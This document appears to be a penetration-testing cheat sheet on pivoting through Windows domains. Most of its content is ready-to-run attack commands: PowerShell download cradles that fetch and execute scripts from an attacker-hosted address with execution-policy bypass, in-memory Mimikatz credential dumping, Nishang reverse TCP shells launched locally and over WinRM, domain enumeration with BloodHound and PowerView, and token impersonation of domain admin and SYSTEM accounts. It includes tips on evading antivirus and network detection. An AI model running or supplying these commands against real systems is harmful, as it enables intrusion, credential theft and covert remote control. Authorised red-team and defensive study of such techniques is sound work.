# Pivoting

Pivoting means to move across machines in an environment. This article is about using different techniques to achieve both enumeration of the domain, popping shells, and executing exploits to gain further access. Of course we use the prevalence of Powershell in modern Windows environments to our advantage. We also string together many of these tricks towards efficient and stealthy hacking with a small footprint. Powershhell can do a lot straight into memory without dropping files to disk. BOX01 will be the name of the example box in this article. 10.10.10.10 is also just an example of what would be your local IP address when performing such attacks. Hosting files for download from kali is easy using `python -SimpleHTTPServer 80`

It can also be wise to here set up a local certificate on the server and use HTTPS/443 to avoid detection by network security controls.

Most of these tricks can be employed with only a domain user.

### Downloading/uploading files

Downloading files to boxes willsometimes be necessary, but don't forget that Powershell has the ability to do so much both remotely and execute straight in memory, which is better when you need to be a ninja or bypass things like Antivirus.

This will download a file to the current folder with the same name. An interactive powershell is not necessary for running these commands. They can be ran straight from CMD.

`Powershell.exe -nop -exec bypass -c "IEX (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10/file.txt');"`

This will download to a specific folder and with a specific name as specified in the second argument of the DownloadFile function.

`Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadFile('http://10.10.10.10/PowerView.ps1','C:\tmp\PowerView.ps1');"`



### BloodHound



Powershell -exec bypass

Import-module sharphound.ps1

Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing

### Remoting

Using WMIC, check which users have sessions on a remote machine. Local administrator privileges are not necessary to execute this remotely.

```
wmic /node:box01.lab.local path win32_loggedonuser get antecedent
```



Powershell supports WinRM natively, which allows remote execution of commands. Here is how to execute a command on a remote box the current user has access to only using tokens, \(no prompt for password or PTH\). Here the hostname command is used for verification, but you can essentially replace it with any command, like powershell.

`Invoke-Command -ComputerName BOX01 -Scriptblock {hostname}`



### Powerview

Powerview is a super useful set of tools for enumerating a domain. The script and full command list can be found here:

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

In powerview, there is a super useful function called `Invoke-EnumerateLocalAdmin` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users.



If you want to go hail mary and fuck shit up you can run every single module in Powerview:

In PowerUp.ps1, add `Invoke-AllChecks` at the bottom of the file. This makes the powershell script execute that function straight into memory after the string has been downloaded. This works for any function inside a powershell-script.

`Powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”`

### Mimikatz

Similar as with powervioew, add a line at the bottom of the ps1 file stating the command you want to execute.  Immediate results straight in the terminal!

```
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```

### Shells

Ninshang shells are the shit https://github.com/samratashok/nishang/tree/master/Shells

```
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"

```

We can do the same thing remotely to a box we have access to using WinRM.

```powershell
Invoke-Command -ComputerName BOX01  -Scriptblock {Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClien
t).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"}
```

### Token impersonation

We can do token impersonation completely without Meterpreter, which is really nice. This trick spawns a new thread, but also works in the same thread. However, if you type whoami it might still show the old user. If you however spawn a new process and migrate to that you will have a shell as the account you are impersonating.

Invokes token impersonation on a domain user. If this doesn't work you can try impersonating SYSTEM and then dropping credentials using mimikatz.

`Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"`

`Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`

`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`

